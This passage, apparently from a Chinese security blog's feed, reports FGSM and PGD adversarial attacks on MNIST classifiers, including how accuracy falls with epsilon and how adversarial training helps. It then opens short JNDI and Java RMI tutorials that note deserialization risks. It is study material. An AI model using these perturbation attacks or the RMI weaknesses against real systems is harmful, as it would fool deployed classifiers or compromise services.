\epsilon\)</span>范围内的操作。</li></ul><p>PGD通过多次迭代和投影操作，能够更有效地探索对抗样本的空间，提高了攻击的成功率和对抗的鲁棒性。相比于FGSM，PGD生成的对抗样本更具挑战性，更难以被模型检测和防御。</p><h5 id="区别总结">区别总结：</h5><ul><li><strong>迭代次数</strong>：FGSM只进行一次梯度方向的修改，而PGD通过多次迭代来逐步优化对抗样本。</li><li><strong>复杂度</strong>：PGD比FGSM更复杂，因为它涉及到多次梯度计算和更新操作。</li><li><strong>对抗鲁棒性</strong>：PGD生成的对抗样本通常更具挑战性和鲁棒性，相比之下，FGSM生成的对抗样本可能较容易被检测和防御。</li></ul><h2 id="实验部分">实验部分</h2><h4 id="实验环境和基本参数">实验环境和基本参数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">实验环境：</span></span><br><span class="line"><span class="string">镜像：PyTorch 1.10.0 + Python 3.8 (Ubuntu 20.04) + Cuda 11.3</span></span><br><span class="line"><span class="string">硬件配置：GPU: 1 x RTX 2080 Ti (11GB) + CPU: 12 vCPU Intel(R) Xeon(R) Platinum 8255C @ 2.50GHz</span></span><br><span class="line"><span class="string">内存: 40GB</span></span><br><span class="line"><span class="string">存储：系统盘: 30GB + 数据盘: 50GB</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">criterion = nn.CrossEntropyLoss()<span class="comment"># 损失函数</span></span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=<span class="number">0.01</span>)<span class="comment"># 优化函数</span></span><br><span class="line">epoch = <span class="number">10</span><span class="comment"># 训练迭代次数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据加载</span></span><br><span class="line">transform = transforms.Compose([transforms.ToTensor()])</span><br><span class="line">train_dataset = datasets.MNIST(root=<span class="string">&#x27;../data_row&#x27;</span>, train=<span class="literal">True</span>, download=<span class="literal">True</span>, transform=transform)</span><br><span class="line">test_dataset = datasets.MNIST(root=<span class="string">&#x27;../data_row&#x27;</span>, train=<span class="literal">False</span>, download=<span class="literal">True</span>, transform=transform)</span><br><span class="line">train_loader = torch.utils.data.DataLoader(dataset=train_dataset, batch_size=<span class="number">64</span>, shuffle=<span class="literal">True</span>)</span><br><span class="line">test_loader = torch.utils.data.DataLoader(dataset=test_dataset, batch_size=<span class="number">64</span>, shuffle=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>模型训练迭代次数：10次</p><h4 id="模型选择">模型选择</h4><h5 id="简单全连接神经网络">简单全连接神经网络</h5><p>模型结构</p><figure><img src="/post/cda691ed/SimpleFNN.png" alt="SimpleFNN"><figcaption aria-hidden="true">SimpleFNN</figcaption></figure><h6 id="训练效果">训练效果</h6><p>准确率 &amp;&amp; 损失</p><p>全连接层的准确率达到93%左右，损失变化波动较大（可能是迭代次数太小了？）</p><p><img src="/post/cda691ed/SimpleFCN_accuracies.jpg" alt="SimpleFCN_accuracies" style="zoom: 20%;"><img src="/post/cda691ed/SimpleFCN_losses.jpg" alt="SimpleFCN_losses" style="zoom:20%;"></p><h6 id="fgsm攻击效果">FGSM攻击效果</h6><p>样本展示</p><p><img src="/post/cda691ed/SimpleFCN_fgsm_epsilon_0.05_batch_0_image_1.png" alt="SimpleFCN_fgsm_epsilon_0.05_batch_0_image_1" style="zoom: 33%;"><img src="/post/cda691ed/SimpleFCN_fgsm_epsilon_0.1_batch_0_image_1.png" alt="SimpleFCN_fgsm_epsilon_0.1_batch_0_image_1" style="zoom: 33%;"><img src="/post/cda691ed/SimpleFCN_fgsm_epsilon_0.15_batch_0_image_1.png" alt="SimpleFCN_fgsm_epsilon_0.15_batch_0_image_1" style="zoom: 33%;"></p><p><img src="/post/cda691ed/SimpleFCN_fgsm_epsilon_0.2_batch_0_image_1.png" alt="SimpleFCN_fgsm_epsilon_0.2_batch_0_image_1" style="zoom: 33%;"><img src="/post/cda691ed/SimpleFCN_fgsm_epsilon_0.25_batch_0_image_1.png" alt="SimpleFCN_fgsm_epsilon_0.25_batch_0_image_1" style="zoom: 33%;"><img src="/post/cda691ed/SimpleFCN_fgsm_epsilon_0.3_batch_0_image_1.png" alt="SimpleFCN_fgsm_epsilon_0.3_batch_0_image_1" style="zoom: 33%;"></p><p>攻击后的准确率随着设置的epsilons增大逐步下降，前期下降很快，特别是在0.1处下降最快，且SimpleFNN的准确度再epsilons达到0.2接近0，再增加eps就准确率就直接降为0了<img src="/post/cda691ed/SimpleFCN_fgsm_accuracies.jpg" alt="SimpleFCN_fgsm_accuracies" style="zoom:25%;"></p><h6 id="对抗训练之后的攻击效果"><strong>对抗训练之后的攻击效果</strong></h6><p>当以eps=0.1的对抗样本对模型做对抗训练，同样以eps为0.1的对抗样本做测试，能看出准确率有一个稳定上升，右边是对抗不同eps产生的对抗样本的效果</p><p><img src="/post/cda691ed/SimpleFCN_adversarial_fgsm_accuracies.jpg" alt="SimpleFCN_adversarial_fgsm_accuracies" style="zoom: 20%;"><img src="/post/cda691ed/SimpleFCN_adversarial_accuracies.jpg" alt="SimpleFCN_adversarial_accuracies" style="zoom:20%;"></p><h6 id="pgd攻击效果">PGD攻击效果</h6><p>自变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eps：epsilon，对抗攻击的幅度，即每次攻击时允许的最大扰动量。</span><br><span class="line">num_iter:轮数，对抗攻击迭代的次数，即进行对抗攻击的循环次数。</span><br><span class="line">alpha：单步攻击步长，每次对原始样本进行梯度上升的步长大小</span><br></pre></td></tr></table></figure><p>每种攻击幅度下的准确率的变化幅度并不大，eps为0.05时，变化规模为0.7480-0.7472，在eps为0.1就降到了0.3，0.15降到了0.12，后面还有进一步下降，但无论哪种攻击幅度，alpha和num_iter只要不是最小值，准确率下降效果都很好</p><p><img src="/post/cda691ed/SimpleFCN_0.05_accuracies.jpg" alt="SimpleFCN_0.05_accuracies" style="zoom:10%;"><img src="/post/cda691ed/SimpleFCN_0.1_accuracies.jpg" alt="SimpleFCN_0.1_accuracies" style="zoom:10%;"><img src="/post/cda691ed/SimpleFCN_0.15_accuracies.jpg" alt="SimpleFCN_0.15_accuracies" style="zoom:10%;"></p><p><img src="/post/cda691ed/SimpleFCN_0.2_accuracies.jpg" alt="SimpleFCN_0.2_accuracies" style="zoom:10%;"><img src="/post/cda691ed/SimpleFCN_0.25_accuracies.jpg" alt="SimpleFCN_0.25_accuracies" style="zoom:10%;"><img src="/post/cda691ed/SimpleFCN_0.3_accuracies.jpg" alt="SimpleFCN_0.3_accuracies" style="zoom:10%;"></p><h5 id="卷积神经网络">卷积神经网络</h5><p>模型结构</p><figure><img src="/post/cda691ed/SimpleCNN.png" alt="SimpleCNN"><figcaption aria-hidden="true">SimpleCNN</figcaption></figure><h6 id="训练效果-1">训练效果</h6><p>准确率 &amp;&amp; 损失</p><p>简单卷积网络的的准确率比全连接层效果较好，且迭代一次准确率就达到91%以上，同样loss的变化存在一定波动，不够平滑，但相对于全连接层效果更好</p><p><img src="/post/cda691ed/SimpleCNN_accuracies.jpg" alt="SimpleCNN_accuracies" style="zoom:20%;"><img src="/post/cda691ed/SimpleCNN_losses.jpg" alt="SimpleCNN_losses" style="zoom:20%;"></p><h6 id="fgsm攻击效果-1">FGSM攻击效果</h6><p>样本展示</p><p><img src="/post/cda691ed/SimpleCNN_fgsm_epsilon_0.05_batch_0_image_1.png" alt="SimpleCNN_fgsm_epsilon_0.05_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/SimpleCNN_fgsm_epsilon_0.1_batch_0_image_1.png" alt="SimpleCNN_fgsm_epsilon_0.1_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/SimpleCNN_fgsm_epsilon_0.15_batch_0_image_1.png" alt="SimpleCNN_fgsm_epsilon_0.15_batch_0_image_1" style="zoom:33%;"></p><p><img src="/post/cda691ed/SimpleCNN_fgsm_epsilon_0.2_batch_0_image_1.png" alt="SimpleCNN_fgsm_epsilon_0.2_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/SimpleCNN_fgsm_epsilon_0.25_batch_0_image_1.png" alt="SimpleCNN_fgsm_epsilon_0.25_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/SimpleCNN_fgsm_epsilon_0.3_batch_0_image_1.png" alt="SimpleCNN_fgsm_epsilon_0.3_batch_0_image_1" style="zoom:33%;"></p><p>攻击后的准确率随着设置的epsilons变化</p><p>这个变化趋势和全连接层的变化规律相似，但对抗效果比SImpleFNN好，在eps达到0.2是准确率还没完全下降到0，同样在0.1-0.15区间下降最快</p><p><img src="/post/cda691ed/SimpleCNN_fgsm_accuracies.jpg" alt="SimpleCNN_fgsm_accuracies" style="zoom:25%;"></p><h6 id="对抗训练之后的攻击效果-1"><strong>对抗训练之后的攻击效果</strong></h6><p>当以eps=0.1的对抗样本对模型做对抗训练，同样以eps为0.1的对抗样本做测试，能看出准确率有一个稳定上升，右边是对抗不同eps产生的对抗样本的效果</p><p><img src="/post/cda691ed/SimpleCNN_adversarial_fgsm_accuracies.jpg" alt="SimpleCNN_adversarial_fgsm_accuracies" style="zoom: 20%;"><img src="/post/cda691ed/SimpleCNN_adversarial_accuracies.jpg" alt="SimpleCNN_adversarial_accuracies" style="zoom:20%;"></p><h6 id="pgd攻击效果-1">PGD攻击效果</h6><p>自变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eps：epsilon，对抗攻击的幅度，即每次攻击时允许的最大扰动量。</span><br><span class="line">num_iter:轮数，对抗攻击迭代的次数，即进行对抗攻击的循环次数。</span><br><span class="line">alpha：单步攻击步长，每次对原始样本进行梯度上升的步长大小</span><br></pre></td></tr></table></figure><p>在eps上升到0.15之前，攻击效果并没呈现出随着其他参数增加而变化的效果，但是相同的是，每种幅度下的攻击效果相似，准确率变化幅度不大，eps为0.05，几乎没有攻击效果，其他参数增加，攻击效果反而下降，eps为1效果同样如此，特别是alpha参数增加，攻击效果下降，而eps加到0.15及以上之后，准确率的变化形式几乎和SImpleFNN一致，但是准确率保持在了0.2的最高值，效果比全连接层好</p><p><img src="/post/cda691ed/SimpleCNN_0.05_accuracies.jpg" alt="SimpleCNN_0.05_accuracies" style="zoom:10%;"><img src="/post/cda691ed/SimpleCNN_0.1_accuracies.jpg" alt="SimpleCNN_0.1_accuracies" style="zoom:10%;"><img src="/post/cda691ed/SimpleCNN_0.15_accuracies.jpg" alt="SimpleCNN_0.15_accuracies" style="zoom:10%;"></p><p><img src="/post/cda691ed/SimpleCNN_0.2_accuracies.jpg" alt="SimpleCNN_0.2_accuracies" style="zoom:10%;"><img src="/post/cda691ed/SimpleCNN_0.25_accuracies.jpg" alt="SimpleCNN_0.25_accuracies" style="zoom:10%;"><img src="/post/cda691ed/SimpleCNN_0.3_accuracies.jpg" alt="SimpleCNN_0.3_accuracies" style="zoom:10%;"></p><h5 id="深度卷积神经网络">深度卷积神经网络</h5><p>模型结构</p><figure><img src="/post/cda691ed/DeepCNN.png" alt="DeepCNN"><figcaption aria-hidden="true">DeepCNN</figcaption></figure><h6 id="训练效果-2">训练效果</h6><p>准确率 &amp;&amp; 损失</p><p>迭代次数较小的准确率并不高，但存在"突飞猛进"点，即epoch为2-4区间发生了猛增，并保持高准确率，虽前期准确率没有上面两种结构高，但学习速度远超于以上两种模型，此外，损失率也很快逼近0并保持，不存在过大起伏，基本保持持续下降后保持</p><p><img src="/post/cda691ed/DeepCNN_accuracies.jpg" alt="DeepCNN_accuracies" style="zoom:20%;"><img src="/post/cda691ed/DeepCNN_losses.jpg" alt="DeepCNN_losses" style="zoom:20%;"></p><h6 id="fgsm攻击效果-2">FGSM攻击效果</h6><p>样本展示</p><p><img src="/post/cda691ed/DeepCNN_fgsm_epsilon_0.05_batch_0_image_1.png" alt="DeepCNN_fgsm_epsilon_0.05_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/DeepCNN_fgsm_epsilon_0.1_batch_0_image_1.png" alt="DeepCNN_fgsm_epsilon_0.1_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/DeepCNN_fgsm_epsilon_0.15_batch_0_image_1.png" alt="DeepCNN_fgsm_epsilon_0.15_batch_0_image_1" style="zoom:33%;"></p><p><img src="/post/cda691ed/DeepCNN_fgsm_epsilon_0.2_batch_0_image_1.png" alt="DeepCNN_fgsm_epsilon_0.2_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/DeepCNN_fgsm_epsilon_0.25_batch_0_image_1.png" alt="DeepCNN_fgsm_epsilon_0.25_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/DeepCNN_fgsm_epsilon_0.3_batch_0_image_1.png" alt="DeepCNN_fgsm_epsilon_0.3_batch_0_image_1" style="zoom:33%;"></p><p>攻击后的准确率随着设置的epsilons变化</p><p>效果略好于SimpleCNN，但优势不明显，eps为0.1-0.15变化最快</p><p><img src="/post/cda691ed/DeepCNN_fgsm_accuracies.jpg" alt="DeepCNN_fgsm_accuracies" style="zoom:25%;"></p><h6 id="对抗训练之后的攻击效果-2"><strong>对抗训练之后的攻击效果</strong></h6><p>当以eps=0.1的对抗样本对模型做对抗训练，同样以eps为0.1的对抗样本做测试，训练过程准确率虽有上升但不稳定，右边是对抗不同eps产生的对抗样本的效果，比上图有改进，但效果不大，对eps再增加产生的对抗样本的对抗效果不好</p><p><img src="/post/cda691ed/DeepCNN_adversarial_fgsm_accuracies.jpg" alt="DeepCNN_adversarial_fgsm_accuracies" style="zoom: 20%;"><img src="/post/cda691ed/DeepCNN_adversarial_accuracies.jpg" alt="DeepCNN_adversarial_accuracies" style="zoom:20%;"></p><h6 id="pgd攻击效果-2">PGD攻击效果</h6><p>自变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eps：epsilon，对抗攻击的幅度，即每次攻击时允许的最大扰动量。</span><br><span class="line">num_iter:轮数，对抗攻击迭代的次数，即进行对抗攻击的循环次数。</span><br><span class="line">alpha：单步攻击步长，每次对原始样本进行梯度上升的步长大小</span><br></pre></td></tr></table></figure><p>eps大于0.15变化趋势和上面两种一致，且对抗效果优于以上两种神经网络结构，同样存在eps为0.05时，其他参数增加反而降低攻击效果</p><p><img src="/post/cda691ed/DeepCNN_0.05_accuracies.jpg" alt="DeepCNN_0.05_accuracies" style="zoom:10%;"><img src="/post/cda691ed/DeepCNN_0.1_accuracies.jpg" alt="DeepCNN_0.1_accuracies" style="zoom: 10%;"><img src="/post/cda691ed/DeepCNN_0.15_accuracies.jpg" alt="DeepCNN_0.15_accuracies" style="zoom:10%;"></p><p><img src="/post/cda691ed/DeepCNN_0.2_accuracies.jpg" alt="DeepCNN_0.2_accuracies" style="zoom:10%;"><img src="/post/cda691ed/DeepCNN_0.25_accuracies.jpg" alt="DeepCNN_0.25_accuracies" style="zoom:10%;"><img src="/post/cda691ed/DeepCNN_0.3_accuracies.jpg" alt="DeepCNN_0.3_accuracies" style="zoom:10%;"></p><h5 id="残差神经网络">残差神经网络</h5><p>模型结构</p><figure><img src="/post/cda691ed/ResNet.png" alt="ResNet"><figcaption aria-hidden="true">ResNet</figcaption></figure><h6 id="训练效果-3">训练效果</h6><p>准确率 &amp;&amp; 损失</p><p>效果时这四种模型中效果最好的，即使迭代次数少，但准确率已能达到98.7%以上，甚至超过了上面某些模型迭代十次的效果，损失率页很快就逼进了0</p><p><img src="/post/cda691ed/ResNet18_accuracies.jpg" alt="ResNet18_accuracies" style="zoom:20%;"><img src="/post/cda691ed/ResNet18_losses.jpg" alt="ResNet18_losses" style="zoom:20%;"></p><h6 id="fgsm攻击效果-3">FGSM攻击效果</h6><p>样本展示</p><p><img src="/post/cda691ed/ResNet18_fgsm_epsilon_0.05_batch_0_image_1.png" alt="ResNet18_fgsm_epsilon_0.05_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/ResNet18_fgsm_epsilon_0.1_batch_0_image_1.png" alt="ResNet18_fgsm_epsilon_0.1_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/ResNet18_fgsm_epsilon_0.15_batch_0_image_1.png" alt="ResNet18_fgsm_epsilon_0.15_batch_0_image_1" style="zoom:33%;"></p><p><img src="/post/cda691ed/ResNet18_fgsm_epsilon_0.2_batch_0_image_1.png" alt="ResNet18_fgsm_epsilon_0.2_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/ResNet18_fgsm_epsilon_0.25_batch_0_image_1.png" alt="ResNet18_fgsm_epsilon_0.25_batch_0_image_1" style="zoom:33%;"><img src="/post/cda691ed/ResNet18_fgsm_epsilon_0.3_batch_0_image_1.png" alt="ResNet18_fgsm_epsilon_0.3_batch_0_image_1" style="zoom:33%;"></p><p>攻击后的准确率随着设置的epsilons变化</p><p>对抗效果虽略优于其他模型，但是准确率仍下降到了0.2以下，只是没有特别逼近0，按照后面的趋势，应该能保证这个幅度</p><p><img src="/post/cda691ed/ResNet18_fgsm_accuracies.jpg" alt="ResNet18_fgsm_accuracies" style="zoom:25%;"></p><h6 id="对抗训练之后的攻击效果-3"><strong>对抗训练之后的攻击效果</strong></h6><p>当以eps=0.1的对抗样本对模型做对抗训练，同样以eps为0.1的对抗样本做测试，和深度卷积网络一样，训练过程没有保持持续上升，但是准确率提升很多，右边是对抗不同eps产生的对抗样本的效果，相比于没有对抗训练的效果提升很多</p><p><img src="/post/cda691ed/ResNet18_adversarial_fgsm_accuracies.jpg" alt="ResNet18_adversarial_fgsm_accuracies" style="zoom:20%;"><img src="/post/cda691ed/ResNet18_adversarial_accuracies.jpg" alt="ResNet18_adversarial_accuracies" style="zoom:20%;"></p><h6 id="pgd攻击效果-3">PGD攻击效果</h6><p>自变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eps：epsilon，对抗攻击的幅度，即每次攻击时允许的最大扰动量。</span><br><span class="line">num_iter:轮数，对抗攻击迭代的次数，即进行对抗攻击的循环次数。</span><br><span class="line">alpha：单步攻击步长，每次对原始样本进行梯度上升的步长大小</span><br></pre></td></tr></table></figure><p>对抗效果是最差的，eps从0.1开始，其准确率就下降到了10%以下</p><p><img src="/post/cda691ed/ResNet18_0.05_accuracies.jpg" alt="ResNet18_0.05_accuracies" style="zoom:10%;"><img src="/post/cda691ed/ResNet18_0.1_accuracies.jpg" alt="ResNet18_0.1_accuracies" style="zoom:10%;"><img src="/post/cda691ed/ResNet18_0.15_accuracies.jpg" alt="ResNet18_0.15_accuracies" style="zoom:10%;"></p><p><img src="/post/cda691ed/ResNet18_0.2_accuracies.jpg" alt="ResNet18_0.2_accuracies" style="zoom:10%;"><img src="/post/cda691ed/ResNet18_0.25_accuracies.jpg" alt="ResNet18_0.25_accuracies" style="zoom:10%;"><img src="/post/cda691ed/ResNet18_0.3_accuracies.jpg" alt="ResNet18_0.3_accuracies" style="zoom:10%;"></p><h4 id="分析总结">分析总结</h4><h6 id="某些情况中当alpha和num_iter增大时攻击效果反而变差">某些情况中，当alpha和num_iter增大时，攻击效果反而变差</h6><p><strong>过度迭代导致过拟合对抗方向</strong>：</p><ul><li>如果步长和迭代次数太大，扰动可能会变得过于复杂（特别eps较小时），远离了使得模型误分类的有效方向，从而导致对抗样本变得无效。</li><li>过度迭代可能会导致对抗样本变得更加离散，不再沿着最有效的攻击方向。</li></ul><p><strong>数值稳定性问题</strong>：</p><ul><li>过大的步长和迭代次数可能会导致数值不稳定性，扰动值可能超出有效范围，无法正确引导模型误分类。</li></ul><h6 id="resnet在非对抗情况下表现最好但在对抗攻击下表现最差">ResNet在非对抗情况下表现最好，但在对抗攻击下表现最差</h6><p><strong>模型复杂性和过拟合</strong>：</p><ul><li>ResNet由于其复杂性和深度，在训练时可能会过度拟合训练数据，导致在对抗攻击时，模型更容易受到影响。</li><li>复杂的模型可能捕捉到数据中的细微特征，导致对抗样本能更容易地找到这些特征的脆弱点。</li></ul><h6 id="epsilonε">epsilon（ε）</h6><p>在PGD攻击中，epsilon（ε）代表了对抗扰动的最大幅度，alpha（α）是每一步的步长，而num_iter是总的迭代次数。固定epsilon之后，alpha和num_iter的作用相对较小：</p><p><strong>epsilon定义了扰动的上限</strong>：</p><ul><li>epsilon（ε）直接控制了扰动的最大幅度。因此，无论alpha和num_iter如何调整，扰动的总幅度不能超过epsilon定义的范围。这意味着epsilon是决定攻击强度的主要因素。</li></ul><p><strong>alpha和num_iter影响攻击的细节</strong>：</p><ul><li>alpha和num_iter更多地影响了生成对抗样本的路径和细节。当epsilon固定时，增加alpha和num_iter可以帮助更细致地探索对抗方向，但最终的扰动幅度还是受到epsilon的限制。</li><li>增大num_iter会使攻击更加逼近epsilon所能达到的极限，而增大alpha则可能会让每一步的扰动更大，但由于最终扰动不能超过epsilon，过大的alpha可能导致不稳定的扰动，反而不利于有效攻击。</li></ul><p><strong>步长和迭代次数的权衡</strong>：</p><ul><li>较大的alpha可能在每一步产生过大的扰动，导致无法有效逼近最优对抗方向。而较小的alpha配合更多的迭代次数可以在epsilon范围内更细致地调整扰动，使得攻击效果更佳。</li><li>num_iter的增加可以让扰动更充分地逼近epsilon的边界，但如果alpha过大，num_iter的增加作用会减弱，因为每一步的扰动已经很接近epsilon。</li></ul><h6 id="对抗训练有效提升模型对抗样本的鲁棒性">对抗训练有效提升模型对抗样本的鲁棒性</h6><p>通过对抗训练，模型（特别是ResNet）的准确率在对抗样本上有显著提升。这表明对抗训练有效增强了模型对对抗扰动的抵抗能力。对抗训练通过在训练过程中引入对抗样本，使模型学会如何处理和抵御这些样本，从而在测试时能够更好地应对对抗攻击。</p><h5 id="总结-1">总结</h5><ol type="1"><li><strong>epsilon是决定攻击强度的主要因素</strong>：<ul><li>它定义了对抗扰动的最大范围，因此是决定攻击效果的主要因素。</li></ul></li><li><strong>alpha和num_iter的选择需要平衡</strong>：<ul><li>适中的alpha和num_iter组合能够在epsilon范围内生成有效的对抗扰动。过大的alpha和num_iter可能导致扰动过度复杂化，扰动效果反而下降。</li></ul></li><li><strong>复杂模型对抗效果的特殊性</strong>：<ul><li>复杂模型（如ResNet）在高维特征空间中的扰动路径更容易不稳定，因此需要特别注意alpha和num_iter的选择。</li></ul></li><li><strong>对抗训练的重要性</strong><ul><li>对抗训练增强了模型的泛化能力，使其在面对未见过的对抗样本时也能表现出色</li></ul></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;fgsm&quot;&gt;FGSM&lt;/h2&gt;
&lt;p&gt;论文链接： [&lt;a href=&quot;https://arxiv.org/abs/1412.6572&quot;&gt;1412.6572]
Explaining and Harnessing Adversarial Examples (arxiv.org)&lt;/a&gt;[&lt;a href=&quot;https://arxiv.org/abs/1412.6572&quot;&gt;1412.6572] Explaining and
Harnessing Adversarial Examples (arxiv.org)&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;研究点&quot;&gt;研究点&lt;/h4&gt;
&lt;p&gt;设计更强大的优化方法，能够在训练过程中有效处理非线性模型的复杂性，从而同时实现训练的易用性和对抗性扰动的抵抗能力&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>JNDI学习</title>
    <link href="http://example.com/post/eb02829d.html"/>
    <id>http://example.com/post/eb02829d.html</id>
    <published>2024-06-22T13:37:02.000Z</published>
    <updated>2024-09-28T16:17:24.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="what-is-jndi">What is JNDI</h3><p>JNDI（Java Naming and DirectoryInterface）是一个API，它允许Java应用程序发现和查找基于名称的资源。JNDI的设计目的是提供一种通用的方式来访问各种命名和目录服务。</p><p>主要功能：</p><ul><li><p><strong>命名Naming</strong>：通过名称来查找和绑定Java对象。命名服务的典型用途包括查找数据库连接、JavaRMI对象、EJB（Enterprise JavaBeans）等。</p></li><li><p><strong>目录Directory</strong>：除了命名功能，JNDI还支持访问目录服务，允许在对象中存储和检索属性。目录服务使得可以对命名对象进行更复杂的查询和操作。目录服务= 命名服务 + 包含属性的对象</p></li></ul><h3 id="examplermi-jndi">EXAMPLE(RMI + JNDI)</h3><p>step 1: 创建InitialContext()初始化上下文</p><p>step 2: 将远程服务对象绑定到指定url</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;what-is-jndi&quot;&gt;What is JNDI&lt;/h3&gt;
&lt;p&gt;JNDI（Java Naming and Directory
Interface）是一个API，它允许Java应用程序发现和查找基于名称的资源。JNDI的设计目的是提供一种通用的方式来访问各</summary>
      
    
    
    
    <category term="JNDI" scheme="http://example.com/categories/JNDI/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>rmi_1</title>
    <link href="http://example.com/post/a787da62.html"/>
    <id>http://example.com/post/a787da62.html</id>
    <published>2024-06-13T13:31:12.000Z</published>
    <updated>2024-09-28T16:17:22.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="初识rmi">初识RMI</h3><ul><li>概念：Java RMI (Remote Method Invocation)是一种用于构建分布式应用程序的机制，允许Java对象调用远程服务器上的方法。</li></ul><span id="more"></span><ul><li><p>demo</p><p>RMIClient:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  客户端通过LocateRegistry.getRegistry方法获取Registry对象</span></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"><span class="comment">//  客户端通过lookup方法获取远程对象</span></span><br><span class="line"><span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line"><span class="comment">//  客户端调用远程对象的方法</span></span><br><span class="line">System.out.println(remoteObj.sayHello(<span class="string">&quot;Hello, World!&quot;</span>));</span><br></pre></td></tr></table></figure><p>RMIServer:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端创建远程对象</span></span><br><span class="line"><span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line"><span class="comment">// 服务端创建Registry对象</span></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">// 服务端将远程对象绑定到Registry对象</span></span><br><span class="line">registry.bind(<span class="string">&quot;remoteObj&quot;</span>, remoteObj);</span><br></pre></td></tr></table></figure></li><li><p>安全问题</p><ol type="1"><li>RMI允许动态加载类，这可能被滥用进行代码注入攻击。恶意服务器可以发送恶意的类文件，导致客户端执行任意代码。</li><li>RMI依赖Java的序列化机制，将对象序列化为字节流进行传输。反序列化过程中如果处理不当，可能导致反序列化漏洞，使攻击者可以发送恶意数据，从而在目标系统上执行任意代码。</li></ol></li><li><p>组成</p><ul><li>注册中心：哈希表，Naming-&gt;远程对象</li><li>服务端：用代理Skeleton(进行网络请求)</li><li>客户端：连接注册中心，用代理Stub(进行网络请求)</li></ul></li><li><p>通信</p><ul><li>服务端-&gt;注册中心：绑定、重绑定</li><li>注册中心-&gt;服务端：RMI注册服务反向生成</li><li>客户端-&gt;注册中心：Naming</li><li>注册中心-&gt;客户端：获取Stub</li><li>服务端&lt;-&gt;客户端：JRMP通信</li></ul></li></ul><h3 id="服务端">服务端</h3><h4 id="服务端创建远程服务">服务端创建远程服务</h4><blockquote><p>服务端攻击注册中心：一句话逻辑解释：服务端调用bind(name,obj)注册远程对象，其中name，obj会以序列化方式发送给registry，registry反序列化它们，触发boom💣。</p></blockquote><p>创建代码为 <code>IRemoteObj remoteObj = new RemoteObjImpl();</code>，实现类继承了<code>UnicastRemoteObject</code>类，如果服务端要将对象发布，也就是导出到注册端上去给客户端使用的话，那么该导出对象就需要继承<code>UnicastRemoteObject</code>，此时的端口设置为0</p><blockquote><p><code>UnicastRemoteObject</code> 是 Java RMI（Remote MethodInvocation）中用于创建单播远程对象的一个类。单播远程对象是指在某一时刻只能由一个客户端调用的远程对象。这个类提供了基本的功能来导出远程对象，使其可以被远程访问。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">(<span class="type">int</span> port)</span> <span 